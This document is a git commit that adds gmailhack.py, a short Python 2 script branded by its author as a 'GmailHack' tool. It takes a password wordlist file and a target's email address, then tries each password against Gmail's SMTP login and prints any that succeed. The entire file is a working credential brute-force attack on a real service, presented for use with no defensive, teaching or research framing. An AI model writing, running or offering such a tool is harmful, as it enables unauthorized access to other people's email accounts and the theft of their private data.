25db689eff2bc932692ab6a5f493f83196f919a0
Vian1999 <45721697+Vian1999@users.noreply.github.com>
2019-01-02 20:23:19 +0900

    Create gmailhack.py

---
+++ gmailhack.py
@@ -0,0 +1,85 @@
+#!/usr/bin/python
+
+# Made By 1ND0TR0J4N X #
+
+# https://m.facebook.com/vian.alvarez.773 #
+
+######################################################
+
+print ("###############################################################################")
+
+print ("# #")
+
+print ("# 				create by 1ND0TR0J4N X #")
+
+print ("# 								 #")
+
+print ("# 				 GmailHack #")
+
+print ("# #")
+
+print ("# #")
+
+print ("# https://github.com/Vian1999 #")
+
+print ("# https://m.facebook.com/vian.alvarez.773			 #")
+
+print ("###############################################################################")
+
+#######################################################################################################
+
+
+import smtplib
+
+       
+
+######################################################################################################
+
+
+file_path = raw_input('Path of Password File :')
+
+passwfile = open(file_path,'r')
+
+pass_lst = passwfile.readlines()
+
+
+def login():
+
+    i = 0
+
+    usr = raw_input('What is the targets email address :')
+
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+
+    server.ehlo()
+
+    for passw in pass_lst:
+
+      i = i + 1
+
+      print str(i) + '/' + str(len(pass_lst))
+
+      try:
+
+         server.login(usr, passw)
+
+         print '[+] Password Found: %s ' % passw
+
+         break
+
+      except smtplib.SMTPAuthenticationError as e:
+
+         error = str(e)
+
+         if error[14] == '<':
+
+            print '[+] Password Found: %s ' % passw
+
+            break
+
+         else:
+
+            print '[!] Password Incorrect: %s ' % passw
+
+login()
+
